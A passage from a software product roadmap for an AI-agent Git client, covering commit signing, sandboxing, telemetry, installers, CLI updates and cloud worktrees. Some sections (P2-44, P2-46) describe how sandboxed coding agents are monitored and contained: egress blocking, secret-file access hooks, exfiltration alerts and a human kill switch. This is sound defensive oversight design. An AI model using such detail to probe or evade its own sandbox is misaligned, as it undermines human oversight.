**Milestone:** M7.75 · **Priority:** P1 differentiator · **Depends on:** T-15 (signing, shipped), P2-09, P2-15.

The daemon mints an SSH signing key per agent identity (`agent-<adapter>@mainguard-daemon`); every
agent commit is signed with it (local repo config in the worktree, T-15 plumbing); on human
merge approval, the merge commit is signed by the human's own configured key — **attribution at
the Git object level**, surviving clone/fork/push, unlike any vendor's metadata. Verification
badges (T-15) learn the agent-key class (distinct badge). Keys live in the daemon keyring;
rotation policy + revocation list recorded in audit.

**Beat:** complements Agent Trace (P2-11) and exceeds it — traces are annotations; signatures are cryptographic and travel with the objects.
**Edge cases:** repo with signing disabled → agent signing still local-config-scoped (never touches user config); key rotation mid-branch → both keys listed valid for their windows; rebase/curation re-signs with the current key.
**Invariants:** agent keys never sign outside their worktree; the human countersign step is the existing journaled merge (no new merge path).
**Required tests:** agent-commit signature verification fixture; badge classification; rotation window; curation re-sign.

---

## P2-44 — Sandbox health & exfiltration panel (novel — extends P2-07/P2-17)

> **Builds on the daemon logging pipeline (shipped 2026-07).** The `Egress` category + `INetworkTransparencyLog` are a read source for the health/exfiltration strip; the Egress line schema is kept stable for it (shared with P2-17).

**Milestone:** M7.75 · **Priority:** P1 · **Depends on:** P2-07 (egress telemetry), P2-17 (transparency view).

Live per-agent security telemetry as a first-class UI: blocked egress attempts (destination,
process, time), secret-file access attempts (tmpfs audit hooks), anomalous process spawns
(policy list), quarantine-remote push events (P2-06) — each streamed to the audit chain and
rendered as a per-agent health strip + drill-down panel ("your agent tried to POST to
pastebin at 14:02"). Verifiable trust as a visible daily feature, not a whitepaper.

**Invariants:** telemetry read path is read-only over proxy/daemon logs; alerts are events, never auto-kills (the human/kill-switch decides); zero PII beyond what the audit chain already carries.
**Required tests:** fixture log streams → panel VM states; audit-event emission; alert-through-notification routing (P2-32 webhooks).

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §4 (health strip) + §8.** Sandbox health reads as part of the workspace strip and the §8 telemetry panels.

## P2-45 — Agent flight recorder (novel — PTY recording indexed to commits/hunks)

> **Builds on the daemon logging pipeline (shipped 2026-07).** Reuses the same `SecretFieldMask` mask-before-persist discipline, but is distinct from the operational logs — it records PTY streams, not log lines.

**Milestone:** M8 · **Priority:** P2 differentiator · **Depends on:** P2-03/P2-18 (terminal ownership), P2-39 (parsed events), P2-15.

The daemon records agent PTY streams (ring-buffer per session, retention-capped) indexed by
time → commit → hunk (via the P2-39 event stream + worktree commit timestamps): select a hunk in
review, scrub to the exact moment the agent wrote it, see the surrounding tool calls. Replayable
offline; recordings referenced from audit entries (retention/redaction rules shared with P2-15).

**Invariants:** recordings honor the G-13 secret mask before persistence; retention/redaction policy identical to audit payloads; playback is read-only and never re-executes anything.
**Required tests:** record/replay determinism on a scripted session; hunk→timestamp index fixture; mask-before-persist; retention pruning.

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §8.** The flight-recorder surface belongs to the §8 telemetry panel family; badges and states per §9.

---

## P2-46 — Daemon-mediated runtime toolchain resolver (arbitrary tool add, A6-clean)

> **Builds on the daemon logging pipeline (shipped 2026-07).** Each new daemon subsystem adds one `DaemonLogSubsystems`/`DaemonLogCategories` entry (e.g. `Toolchain`) — the documented extension point; a `tool add` logs under it alongside its existing P2-17 transparency line.

**Milestone:** v1.x (the **lead** post-v1.0 feature) · **Priority:** P1 · **Depends on:** P2-07 (sandbox seam + egress proxy + the pre-baked `/opt/toolchain` profile), P2-06 (the daemon read-only git proxy pattern this reuses), P2-17 (network-transparency lines).

Closes the one residual left by P2-07's A6 decision. Today the agent toolchain is **pre-baked** at image-build time into `/opt/toolchain` (jq, ripgrep, fd, tree, gnumake, nodejs, python3, go) and is on `PATH` with **zero runtime egress** — because a runtime `devbox add` resolves nixpkgs from a **git host**, which the default-deny jail (A6, §3.7) forbids. The gap: an agent cannot add an *arbitrary, not-pre-baked* tool mid-session.

P2-46 closes it **without opening the A6 hole**, by moving the resolve+fetch into the trusted daemon (exactly as P2-06 does for git). An agent requests a package (e.g. `mainguard tool add <name>`); the request crosses to the daemon over the existing gRPC control channel (**never** the agent's egress); the **daemon** — the sole component permitted to reach a git host / nixhub — resolves it against a **pinned nixpkgs rev**, builds/fetches the closure, and injects it into the jail's toolchain profile (a per-agent overlay over the read-only `/opt/toolchain`). The *agent's* egress allowlist is unchanged: no git host, no nixhub. Resolution is restricted to an **allowlisted set of package sources** (the F5 caveat: pull-only ≠ unrestricted — a curated source set bounds the supply-chain surface), and every add is a P2-17 transparency line plus an audit entry. This is the runtime successor to the pre-baked profile, not a replacement: the baked set stays the offline-always floor.

**Invariants:** the agent uid never reaches a git host or nixhub (A6 — proven by a jailed `add` that succeeds while the git host is DROPped at the *agent's* egress); resolution is daemon-side against a pinned rev (RT-D2-style command/config provenance — same input → same closure hash); every add emits a P2-17 transparency line + audit entry; a non-allowlisted package source is refused and audited; a freshly-added tool runs in the live session **without severing the agent PTY** (the G-16 rationale for never doing a runtime image build); **no runtime `docker build`** — the closure lands via a daemon-side inject into a writable overlay and the read-only rootfs is preserved.
**Required tests:** jailed `add <tool>` succeeds with the git host blocked at the agent egress (the runtime counterpart to P2-07's `PrebakedToolchain_ShouldBeAvailableInLiveSession`); non-allowlisted source refused + audited; pinned-rev reproducibility (closure-hash stable); transparency + audit line emitted per add; added tool on `PATH` mid-session with the PTY intact; two agents adding concurrently don't corrupt the shared store.

**Design note.** Extends the P2-07 sandbox security model; the residual this fills and the daemon-mediated design are recorded in [`docs/security-architecture.md`](../../security-architecture.md) §"Runtime toolchain: pre-baked, not `devbox add`".

---

## P2-47 — Alpha integration pass: end-to-end live wiring (the "it actually runs" task)

**Milestone:** M7 — **an Alpha v0.1 release requirement** (Alpha does not run without it) · **Priority:** P0 · **Depends on:** P2-09, P2-11, P2-12, P2-13, P2-14 (it closes their deferred wiring seams).

### Why this exists

P2-01…P2-14 are each built and unit-tested **as components behind fixtures/seams** — but the live end-to-end path is not assembled, so today the product is a collection of tested parts that don't yet run together. The gap is structural, not incidental: feature DoDs and verification profiles reward "fixture-driven, no human step", so the concrete wiring (mock→real `DaemonClient`, view mounts, daemon service registration, real container spawn) — the part CI can't easily test — was scoped out of each feature and deferred. There is also **no DI/composition root** (App uses a static `Settings`; the daemon registers services by hand), so wiring is a cross-cutting act no single feature owns. This task owns it: connect the built components into a running product a developer can drive from source.

### Scope — close the accumulated deferrals (each cross-referenced)

1. **Mocks → real daemon (P2-13 §0 acceptance):** swap the control-center prototype's mock services for the P2-02 `DaemonClient`-backed implementations behind the same interfaces (**zero View changes**); no mock service remains in the shipped control-center path.
2. **Mount the deferred UI surfaces:** the P2-11 review cockpit into `MainWindow`; the P2-13 per-agent `Dock.Avalonia` workspace into the live coordinator agent-focus surface (via the leak-free content-swap host P2-13 shipped); wire terminal input end-to-end (P2-09).
3. **Register the daemon composition root:** the P2-12 `ExternalPrIntake` dependency chain (PR service / worktree manager / head fetcher / target resolver / subscription source) so `PrIntakeHostedService` stops idling; the P2-14 `CoordinatorAgent` + spawn path + `RoleInterceptor`; the agent spawn/lifecycle graph (P2-09) — so the daemon resolves the full graph at startup.
4. **Prove the loop:** a developer-run smoke — launch app → connect daemon → spawn a real sandboxed agent → drive it in the terminal → verification runs in the P2-10 queue → review in the P2-11 cockpit → human merge.

### Invariants (MUST)

- **No new business logic** — this is wiring; logic stays in the features it connects (a reviewer finding new domain logic here is a rejection: it belongs in a feature).
- Each mock→real swap is **behind the existing interface** — no View or contract changes (the P2-13 §0 "zero View changes" bar).
- Services are registered in **one composition root**, not scattered ad-hoc (establish it if absent; do not regress to per-call `new`).
- Every wired path already carries its own feature's tests; this pass adds the **end-to-end smoke**, it does not re-test the components.

### Required tests

- The end-to-end developer smoke (`RequiresDocker`): launch→spawn→drive→verify→review→merge, plus a documented manual runbook for the human-visual leg.
- A **"no mock services in the live control-center path"** guard (fails if a mock implementation is resolved in the shipped surface).
- A **daemon DI-resolution test**: the composition root resolves the full intake + coordinator + spawn graph at startup with nothing left idling.

### Definition of done

- [ ] Launch → spawn a real sandboxed agent → drive → verify → review → human-merge works when run from source.
- [ ] The deferred-wiring items from P2-09 / P2-11 / P2-12 / P2-13 / P2-14 are all closed (cross-referenced in the PR).
- [ ] No mock services remain in the shipped control-center path; the daemon composition root resolves the full graph.
- [ ] `docs/repo-map/` index updated. One task = one PR linking **P2-47**, base `phase2`.

### Process fix (so this never re-accumulates)

Going forward, **"wired into the live composition root, not just a fixture" is part of each feature's Definition of Done** — a feature that ships a mock/seam without connecting it to the running app (where its dependencies already exist) is incomplete. P2-47 is the one-time catch-up for the features built before this rule; new features wire themselves.

---

## P2-48 — Unified installed experience: single-exe + in-app OOBE + launch routing (the "one app that just works")

**Milestone:** Beta v0.2 (the packaged product) · **Priority:** P0 for distribution · **Depends on:** P2-21 (provisioning machinery + the tested OOBE state machine), P2-22 (Windows integration / uninstall), P2-05 (bootstrap), P2-47 (the control center it launches into).

### Why this exists (the gap P2-21 did NOT close)
P2-21 is explicitly **"installer part 1"** — the provisioning *machinery* (diagnostics, WSL2 enablement, `MainguardOS.tar.gz` build/import/upgrade). P2-22 is **"part 2"** (Windows integration, OAuth, teardown). But **no ticket owned the actual shipped UX**: a single launchable app that provisions itself on first run and drops into the control center after. So today that experience is scattered — a **console OOBE driver** (P2-21 deliberately deferred its Avalonia shell as GUI-/Windows-only), `dotnet run` for the app, and an un-ticketed Velopack packaging step. The *pieces* of an installer exist; "double-click Mainguard.exe and it just works" is owned by nothing. **P2-48 owns it.** (Same class of gap as P2-47: the machinery was built, but the end-to-end experience wasn't a task.)

### Scope
1. **Single-exe distribution (Velopack):** Mainguard ships as one self-updating executable (Windows first; macOS/Linux later) — no console, no `dotnet run`, no separate installer command. Absorbs the README "Future Distribution / Velopack OOBE" vision into a real task.
2. **In-app OOBE wizard (Avalonia):** wrap P2-21's tested `OobeStateMachine` + `SystemDiagnostics` in the Avalonia UI (design tokens, five themes) — diagnostics cards, the "Construct Sandbox" consent + single UAC, reboot-resume, and VM-import progress render **inside the app**, not a console. Completes P2-21's explicitly-deferred Avalonia shell (same state machine — no divergent second implementation).
3. **Launch routing:** on startup, check whether the runtime is provisioned (MainguardOS present + daemon healthy). **Not provisioned → the OOBE wizard. Provisioned → straight into the control center (P2-47).** One binary, one entry point, two paths.

### Invariants (MUST)
- **No new provisioning/OS logic** — this is UI + packaging + routing over P2-21/P2-22's tested machinery (the P2-47 "wiring, not logic" rule).
- The elevated helper + the payload ship **co-located inside the packaged app** (no "file not found" elevation hand-off gaps).
- OOBE UI uses design tokens only, all five themes; the wizard drives the **same** `OobeStateMachine` the console driver exercised.

### Required tests
- Launch-routing unit test (provisioned → control center; not-provisioned → OOBE) with a faked provisioning probe.
- Velopack package smoke (CI: the packaged artifact launches headlessly + version-stamps).
- A themed render-harness PNG of the OOBE surface (five themes), like every UI feature.
- The real fresh-machine install-and-launch stays the human matrix (shared with P2-21/P2-22).

### Definition of done
- Double-click one packaged executable on a fresh Win11 machine → OOBE wizard → provisioned → control center, with **no command line at any point**.
- P2-21's console driver retired in favor of the in-app wizard (or kept only as a `--headless` dev fallback).
- `docs/repo-map/` index + release ladder updated. One task = one PR linking **P2-48**, base `phase2`.

---

## P2-49 — Agent-CLI lifecycle: user-owned updates, one-click revert, live compatibility fixes (**amends P2-22 §J-5**)

> **Builds on the daemon logging pipeline (shipped 2026-07).** A CLI-lifecycle daemon subsystem adds one `DaemonLogSubsystems`/`DaemonLogCategories` entry (e.g. `CliLifecycle`) — the documented extension point — for update/revert/compat events. **Not yet implemented** (only this spec exists): today's shipped CLI machinery is P2-22 §J-5's install-only path (`AgentCliInstaller`/`AdapterChannel`), so there is no daemon CLI-lifecycle subsystem to instrument yet — the entry is added when P2-49 lands.

**Milestone:** Beta v0.2 · **Priority:** P0 for the agent experience · **Depends on:** P2-22 (adapter channel + manifest), P2-48 (the OOBE CLI picker + Agent CLIs settings surface that this governs).

### Why this exists (and what it changes in P2-22)
P2-22 §J-5 specified a **pinned** adapter channel: Mainguard's manifest names the version, installs are never `@latest`, and *"pinned adapter unaffected by a breaking upstream release"* is an invariant. That protects Mainguard's driver from upstream churn — but at a product cost the spec never weighed: **a Mainguard-installed CLI would permanently lag the same CLI installed directly.** Users would not get upstream features until Mainguard re-pinned, re-tested and re-shipped, and the project would carry a re-pin treadmill for every agent it supports. The design goal is the opposite: **a coding CLI inside Mainguard should be exactly the CLI you would have without Mainguard.**

Two of the original pin's rationales do not survive contact with reality:
- **Offline install — a non-goal, rejected.** These CLIs cannot function without a network (they call a model API), and Mainguard itself is downloaded over the network. Vendoring per-platform binaries to enable offline install solves a problem no user has.
- **Hash-pinned executable — never actually true.** §J-5's sha256 pin covers only the npm **wrapper** tarball. The platform binary arrives separately as an npm `optionalDependency` and was never covered by the pin. The guarantee was thinner than the spec implied; P2-49 states the real posture rather than an aspirational one.

What *does* survive: **an upstream release can break Mainguard's driver** (SessionLeader's PTY interaction, P2-09's yield protocol, P2-10's verification). Automatic updating would break the entire install base at once through no user action. P2-49 keeps that protection **without freezing users on a stale version**.

### The model
**Nothing ever changes under the user. The user updates when they choose. Revert is always one click.**

### Scope
1. **No automatic updates, ever.** An installed CLI's version changes only by explicit user action.
2. **Availability is surfaced, never applied.** Mainguard resolves the latest published version and shows *"update available: X → Y"* in the Agent CLIs settings surface (P2-48). Notification only.
3. **Versioned installs + a pointer.** Install to `/opt/mainguard/adapters/<id>/<version>/` with `<id>/current` pointing at the active version. The read-only jail bind-mount follows the pointer.
4. **One-click revert.** Revert repoints `current` at the previously-installed version. MUST be instant, offline, and guaranteed — the old bits stay on disk. **Never re-download to revert:** the network (or the registry, or an unpublished version) may be exactly what is unavailable at the moment a user needs to roll back.
5. **Retention + pruning.** Keep at least N-1; prune beyond a bounded N.
6. **Live compatibility fixes.** When an upstream release breaks Mainguard's driver, Mainguard MUST be able to ship the fix **through the channel** (a manifest/adapter-config update) rather than an app release. This requires the adapter's CLI-specific behavioural contract to be **data-driven** (as `configShims`/`healthProbe` already are) to the extent practical. Whatever must remain compiled is **documented as such** — "live fix" is a real capability or it is not claimed.

### Invariants (MUST)
- **`@latest` is still never installed.** Mainguard resolves latest → a **concrete version** → installs *that exact version*, recorded. `AdapterManifest.IsPinnedVersion` continues to hold for every install command and §J-5's unpinned-version rejection trigger is **unchanged**. What changes is only **who selects the version**: Mainguard's baked manifest → the user, at a moment of their choosing.
- **No install, update, or version change without explicit user action.**
- **Revert never requires the network** and never depends on the registry still serving the previous version.
- **A failed or reverted update never breaks the daemon, the jail mount, or a running agent session.**
- **Parity:** a Mainguard-installed CLI at version X behaves as that same CLI installed directly at version X. Mainguard does not patch upstream behaviour.

### Security posture (stated honestly, supersedes §J-5's implication)
With user-chosen latest, integrity rests on the npm registry's integrity metadata + TLS — **the same trust chain as the user installing the CLI themselves.** Mainguard claims no stronger guarantee. This supersedes P2-22's implied "hash-verified executable", which never covered the platform binary. The agent jail requires **no additional egress**: CLIs are installed before any agent runs.

### Required tests
- Resolve-latest → concrete version: the install command is pinned and `@latest` never reaches it (schema + unit).
- Update/revert pointer flip: `current` moves, the jail mount follows, the previous version's bits remain intact.
- **Revert with the network unavailable → succeeds.**
- **Revert when the previous version is no longer published upstream → succeeds** (proves no re-download).
- Retention/pruning honours N-1.
- Notification-only: an available update never mutates `current` without user action.
- Settings-surface states across the five themes: update-available, updating, revert-available, failure.

### Rejected alternatives (decided, do not re-litigate)
- **Vendoring platform packages into the payload** — offline install is a non-goal (above); costs payload size and forces a payload re-ship per CLI update.
- **Version ceiling / blocklist** — requires Mainguard to *predict* breakage. Revert handles the failures nobody predicted and confines the blast radius to the single user who chose to update.

### Definition of done
- A user can update a CLI on their terms, see that an update exists without it being applied, and revert a bad update in one click **with the network off**.
- §J-5's manifest/pin machinery is amended (not abandoned): every install remains a concrete, recorded version.
- `docs/repo-map/` index + release ladder updated. One task = one PR linking **P2-49**, base `phase2`.

---

## P2-C4 — Working-copy power tools: split-into-branches wizard & stacked-branch restacking (matches GitButler's jobs-to-be-done at 10% of the cost)

**Milestone:** client-parity track · **Priority:** P1 · **Depends on:** T-06 patch model, T-08 rebase, T-19 journal (all shipped).

1. **Split wizard:** cluster uncommitted changes by path/hunk (T-06 `PatchParser`/`PatchBuilder`) into N proposed groups; the user adjusts groupings; each group commits to its own new branch (sequential apply/commit/reset cycles, journaled, tree-snapshot-protected via P2-37). Explicitly *not* a persistent virtual-branch working mode.
2. **Stacked branches:** mark branch B as stacked on A; when A moves (merge/amend), auto-restack B (T-08 plumbing, T-19 safety net); stack visualization on the shipped graph; restack conflicts route to the T-04 resolver.

**Invariants:** the wizard never loses a hunk (sum of groups == original diff, property-tested); restack is always undoable; no daemon dependency (pure client feature).
**Required tests:** split property test (partition completeness); group-commit round-trip; restack on amend/merge fixtures incl. conflict path.

---

**Design decisions (binding) — [`FeatureDesigns.md`](../../design/FeatureDesigns.md) §4.** The split-into-branches untangling wizard as a designed experience.

## P2-C5 — Client polish pack: standalone mergetool, external difftool, partial stash UI, patch files & WIP sharing, commit templates/gitmoji, diff search, AI commit message (Tower/Fork/Sublime/GitKraken parity checkboxes)

**Milestone:** client-parity track · **Priority:** P2 (each item small; one PR each or grouped sensibly — the task ID covers the set) · **Depends on:** shipped surfaces + P2-32 CLI for (1).

1. **Standalone mergetool mode:** `mainguard mergetool <local> <base> <remote> <merged>` CLI verb opening the shipped T-04 3-pane resolver; registerable as `git mergetool` — our best surface as a trojan horse for terminal users (Sublime `smerge` parity).
2. **External diff/merge tool hand-off:** configurable tool templates (ArgumentList, validated-launcher rules).
3. **Partial stash UI:** multi-select files → "Stash selected" (`git stash push -- <paths>`), include-untracked toggle (backend shipped).
4. **Patch create/apply + WIP sharing:** `format-patch`/`am` wrappers, drag-out `.patch`; "Share as patch ref" pushes `refs/mainguard/patches/<id>` to the existing remote with an import flow (the Git-native 80% of GitKraken Cloud Patches, no hosted service).
5. **Commit templates + gitmoji picker** folded into the shipped T-31 composer.
6. **Diff text search:** Ctrl+F overlay in diff views (verify absence first).
7. **AI commit message (BYOK checkbox):** one prompt over the staged diff via P2-01 keys into the T-31 composer with convention enforcement — explicitly a parity checkbox, not a differentiator (revises the earlier skip: buyers screen for it).

**Required tests:** per item — mergetool arg plumbing + resolver round-trip; stash-paths; patch round-trip incl. ref-share import; composer template/gitmoji snapshot; AI-message convention enforcement with a fixture provider.

---

**Design decisions (binding) — [`FeatureDesigns.md`](../../design/FeatureDesigns.md) §5.** The polish pack designed as experiences; the T-22 analytics redesign mandates (M-D1/M-D2 secondary encodings + gates G-D1…G-D4, with the computed CVD validator record): [`ProductAndUX.md`](../../design/ProductAndUX.md) Part 4 and `docs/design/assets/AnalyticsRedesign.html`.

## P2-50 — Backlog: additive capabilities, not yet scheduled

**Status: BACKLOG, and strictly additive.** Everything here is a capability the product does not have
and is not broken without — recorded so it is a decision rather than something we forgot. **Defects do
not belong in this section**, however small: a known-wrong behaviour parked in a backlog list reads as
"planned" to the next person who finds it, which is how a real bug acquires the appearance of a
roadmap item. Those go to the issue tracker and get fixed.

### P2-50a — Node and Go runtime-mount toolchains

`ToolchainCatalog` ships `python-3` as the first `RuntimeMount` toolchain (P2-46 / PR #314). Node and
Go are self-contained relocatable tarballs with upstream-published checksums, so they are the *same*
delivery kind with a different payload.

**Cost:** an edit to `toolchains.starter.json` — a pinned version-addressed HTTPS tarball, upstream's
own published checksum (never one computed from our download, which is circular), and a probe that
proves the toolchain RUNS rather than that a file arrived. **No C# change, no new delivery kind.**
`ToolchainManifestTests` parses that file, so a bad edit fails CI rather than a user's install.

**Why deferred rather than done:** doing Python properly and proving it end-to-end beats half-doing
three. The evidence that the mechanism generalises is the manifest itself.

---

# 6. WAVE 3 — THE VIBE PRODUCT (K-2…K-5, fully specified)

> Sequencing stays locked: the engine (P2-26) ships with the desktop platform; the Vibe *product*
> is cloud-first ("Mainguard Web") with the desktop simplified-view as the interim. These tasks are
> specified now so no part of the product is unplanned; they enter the build order when M8 exits.

---

## P3-01 — Autonomous Git abstraction: auto-checkpoints + agent conflict resolution (K-2)

**Milestone:** M9 · **Priority:** P0 within the Vibe wave · **Depends on:** P2-26, P2-09.

### Contract

```csharp
// daemon Mainguard.Agents/Agents/Orchestrator/CheckpointService.cs
public sealed record Checkpoint(string Sha, string Summary, DateTimeOffset When, bool VerifiedGreen);
public interface ICheckpointService
{
    /// <summary>Stage-all + commit "Auto-Checkpoint: <summary>" in the agent worktree after each
    /// successful generation loop. Uses a dedicated Vibe author identity; never touches user config.</summary>
    Checkpoint CreateCheckpoint(string repoHash, string agentId, string summary);
    IReadOnlyList<Checkpoint> GetCheckpoints(string repoHash, string agentId, int take = 50);
    /// <summary>Hard-restore the worktree to a checkpoint — worktree-scoped, journaled (T-19),
    /// refused with a typed error if the agent is unpaused.</summary>
    void RestoreCheckpoint(string repoHash, string agentId, string sha);
}
```

Autonomous conflict resolution: on `MergeConflictException` during the keep-alive rebase of a
**Vibe-managed** worker (never a developer-mode one — mode flag on the agent record), feed the
conflicted paths' three-way blobs (T-03 plumbing) to the agent CLI with a structured resolve
prompt; on success `ResolveConflict` + continue; on failure or a second identical conflict,
escalate to P3-02. Marker: resolution attempts are audit events (`conflict_auto_resolved` /
`conflict_escalated`).

### Edge-case matrix

| Case | Required behavior |
|---|---|
| generation loop fails mid-write | no checkpoint; previous checkpoint untouched |
| restore with unpaused agent | typed refusal, nothing changes |
| agent resolves conflict incorrectly (tests fail) | verification catches it; checkpoint marked `VerifiedGreen=false` |
| unresolvable conflict | escalation event; repo left in a **clean conflicted state** (no half-finalized merge) |
| checkpoint spam (agent loops fast) | rate-cap: min interval + max checkpoints, oldest pruned (config) |

### Invariants (MUST)

1. Checkpoints use the Vibe author identity via `GetSignature`-equivalent config on the worktree — never the user's global identity, never a placeholder in user-visible history outside the agent branch.
2. Every restore is journaled and itself undoable.
3. Auto-resolution never runs for developer-mode agents (their conflicts surface to the human resolver, P2-09 behavior).

**Rejection triggers:** auto-resolution writing conflict markers to disk as "resolved"; restore implemented as `Directory` copy instead of Git.
**Required tests:** N chat turns → N tree-valid checkpoints; induced conflict + scripted agent → finalized merge; unresolvable → escalation + clean conflicted state; restore round-trip + journal entry; rate-cap.

---

## P3-02 — Escalation UX: plain-language triage (K-3 — the most important Vibe feature)

**Milestone:** M9 · **Priority:** P0 · **Depends on:** P3-01, P2-26 circuit breaker.

Contract summary (strategy §K-3, binding): on circuit-breaker trip, a plain-language triage screen with exactly three actions:
1. **"Try a different approach"** — re-prompt with failure context (breaker state + last error class), breaker reset with a decayed threshold (2 identical hashes re-trip).
2. **"Go back to when it worked"** — one-click restore to the last `VerifiedGreen` checkpoint (P3-01.Restore; journaled).
3. **"Get help"** — diagnostic bundle: recent transcript (tail), breaker state, checkpoint list, environment summary — **redacted** (P2-01 secrets masked by the same scrub used in T-30's scanner patterns; automated grep test on the artifact).

Wording is non-technical (tested against a copy deck, not developer jargon); the screen never shows raw stack traces by default ("Show technical details" expander).

**Edge cases:** no green checkpoint exists → option 2 disabled with an honest explanation; bundle generation with a live PTY → snapshot without pausing; repeated escalations → option 1 text changes to suggest option 3.
**Invariants:** bundle contains zero key material (automated); every escalation and chosen action is an audit event; restore lands exactly on the last checkpoint that preceded a green verification.
**Required tests:** the three actions from a real breaker trip (scripted agent); bundle redaction grep; no-green-checkpoint gating.

---

**Design decisions (binding) — [`VibeModeDesign.md`](../../design/VibeModeDesign.md) §3.** Plain-language triage with **exactly three actions** — "Try a different approach" / "Go back to when it worked" / "Get help" — no raw stack traces, a "show technical details" expander, honest disabled states.

## P3-03 — Vibe UI: mode toggle, chat, live preview (K-4)

**Milestone:** M9 · **Priority:** P0 · **Depends on:** P3-01, P3-02, P2-13.

Contract summary (strategy §K-4, binding): in-app mode switch (never an installer fork) that collapses the developer dock into a 2-pane **Chat + LivePreview** layout; `LivePreviewControl` (WebView2/CefGlue) navigates on `[APP_READY_ON_PORT_X]` through the localhost bridge port-forward; hot reload works because dev server + sources share ext4 — the preview just points at the forwarded port. Chat renders orchestrator status events as friendly cards (checkpoint created, verifying, escalation); the terminal remains available behind "Show technical details". Toggling back to Developer Mode restores the full dock with the same session intact.

**Edge cases:** multiple dev servers/ports → port picker chip; preview navigation crash → reload affordance, session unaffected; mode toggle mid-generation → no interruption to the agent.
**Invariants:** mode is a view-state, not a data migration; every Vibe action routes through the same journaled/audited services as developer mode (no privileged shortcut paths).
**Required tests:** scaffold-app flow against a scripted dev server (ready-event → preview navigates); chat card rendering from an event fixture stream; toggle round-trip preserving session state (headless harness).

---

**Design decisions (binding) — [`VibeModeDesign.md`](../../design/VibeModeDesign.md) §1/§2/§5 + [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §0.3.** **Vibe is a separate app** — the in-shell Build/Pro toggle is dropped; VibeModeDesign specifies the standalone product's 2-pane Chat + LivePreview, with orchestrator events rendered as friendly cards translating the OPS §3.4 event types. Its views stay implemented and harness-rendered on `phase2`, reachable from no menu.

## P3-04 — One-click deployment (K-5)

**Milestone:** M9 · **Priority:** P1 · **Depends on:** P3-03, P2-22 (loopback OAuth).

Contract summary (strategy §K-5, binding): Vercel + Netlify providers behind an `IDeployProvider` interface (`AcquireTokenAsync` via loopback+PKCE; `CreateProject`, `TriggerDeploy`, `PollStatus`, `GetLiveUrl`); "Publish to Web" = final auto-checkpoint → push to the user's GitHub repo (existing authenticated push path) → trigger → poll → present the live URL; failures route into P3-02's triage pattern (never raw provider logs by default). Tokens keyring-only (`deploy_<provider>`).

**Edge cases:** first publish (no repo yet) → create-repo flow via the host API (T-23 transport); build failure → triage with provider log tail attached (redacted); re-publish → same project, new deploy.
**Invariants:** no token in argv/URL/log (G-13); publish is explicit — never automatic on checkpoint.
**Required tests:** provider clients against recorded fixtures (create/trigger/poll/fail); end-to-end against a real test account (network-gated trait); token-storage audit test.

---

**Design decisions (binding) — [`VibeModeDesign.md`](../../design/VibeModeDesign.md) §4.** The "Publish to Web" flow and the live-URL card.

## P3-05 — Mainguard Web: the hosted Vibe delivery (new — completes the K-stream decision)

**Milestone:** M9/M10 · **Priority:** P1 (the segment's browser-native expectation; the local install cannot win time-to-first-magic) · **Depends on:** P3-03, P2-25 cloud daemon.

### Why

The market v2 decision: Vibe as a **cloud product**. This is the thin slice that turns the cloud
worktree pod (P2-25) + Vibe UI (P3-03) into a browser product: chat + live preview served from a
hosted session, no local install.

### Contract (architecture-level; this task is the spike + walking skeleton)

- `Mainguard.Web` — ASP.NET Core host serving a Blazor/WASM (or thin TS) shell that speaks the
  **same gRPC-web contract** to a cloud daemon pod (G-14 discipline pays off here: zero proto changes).
- Session = one cloud worktree pod (P2-25) running the Vibe orchestrator; preview proxied through
  the pod's egress with an auth cookie; chat over the existing event stream.
- Identity: the P2-23 OIDC infrastructure; repos connected via the host-provider OAuth (T-14/P2-22 flows, web variant).
- The desktop app can **adopt** a web session (open it as a local workspace) — the continuity story Copilot markets.

### Invariants / rejection triggers

1. No web-only fork of orchestrator logic — the pod runs the same daemon binary (G-14/P2-25 acceptance).
2. Preview iframes are sandboxed and served from a per-session origin (no cross-session bleed).
3. Web session actions land in the same audit chain (P2-15) as desktop actions.
Rejection: a second bespoke web protocol; secrets in browser storage beyond the session cookie.

**Required tests:** contract test — web shell drives a pod through the unchanged proto suite; session-origin isolation test; adopt-session round-trip (web → desktop).

---

# 7. WAVE 4 — CLOUD, ECOSYSTEM, HOST PARITY (fully specified)

---

## P3-06 — Cloud worktrees implementation (P2-25 step 2 becomes real)

**Milestone:** M10 (private beta ≤ 2 quarters post-desktop-GA) · **Priority:** P0 of this wave (the scale + usage-revenue story) · **Depends on:** P2-25 guardrails green, P2-02…P2-10.

### Contract

- **Pod image:** the daemon binary + sandbox engine packaged as an OCI image (same binary — G-14); per-tenant pod, per-session worktree containers inside it (nested per the P2-07 spec, or flat with one pod per agent — decided by a 2-week spike, documented ADR).
- **Auth:** mTLS between client and pod front-door + user OIDC token (P2-23 infra); the local session-token mechanism is replaced by a `CloudCredentialProvider` behind the existing `DaemonClient` seam.
- **Repo sync:** `git push mainguard-cloud` over HTTPS with the existing authenticated CLI path; the provisioner's Windows-side remote registration gains a cloud variant (URL instead of UNC).
- **Tenancy:** per-tenant encryption at rest (repo store + audit DB), tenant-scoped keys in a cloud KMS behind `ISecureKeyStore` (P2-24 backends pattern).
- **Metering:** compute-seconds + storage per session streamed as `GatewayService` spend events → billing export (the usage-revenue lever BYOK forfeits locally).
- `RemoteEnvironment` picker in the client: `Local VM | Mainguard Cloud`, per-repo.

### Edge-case matrix

| Case | Required behavior |
|---|---|
| network drop mid-session | terminal reattach via the P2-18 snapshot path; queue state intact |
| pod eviction/restart | session leader pattern re-used; reattach or clean `Dead` state, never silent loss |
| tenant deletes account | pods reaped, repo store + audit export handed over then crypto-shredded (key deletion) |
| clock skew client↔pod | audit ordering by pod sequence, not client time |

### Invariants (MUST)

1. The unchanged P2-14 end-to-end suite passes against a cloud pod (**the** acceptance test, already in CI at 80 ms RTT).
2. No repo bytes leave the tenant boundary except via the user's own `git push`/provider API calls (egress rules apply in-cloud too).
3. Desktop→cloud is a per-repo choice, never a silent default.

**Rejection triggers:** a cloud-only fork of the daemon; tenant data in shared buckets without per-tenant keys.
**Required tests:** the WAN suite against a real pod; multi-tenant isolation test (two tenants, no cross-read); metering accuracy against a scripted session; crypto-shred verification.

---

## P3-07 — Host-provider parity: GitLab (full), Bitbucket, Azure DevOps

**Milestone:** M10 (start any time — independent) · **Priority:** P1 — removes "GitHub-only" from every review of the client · **Depends on:** T-23…T-28 seams (all shipped; non-GitHub hosts are typed stubs today).

### Contract

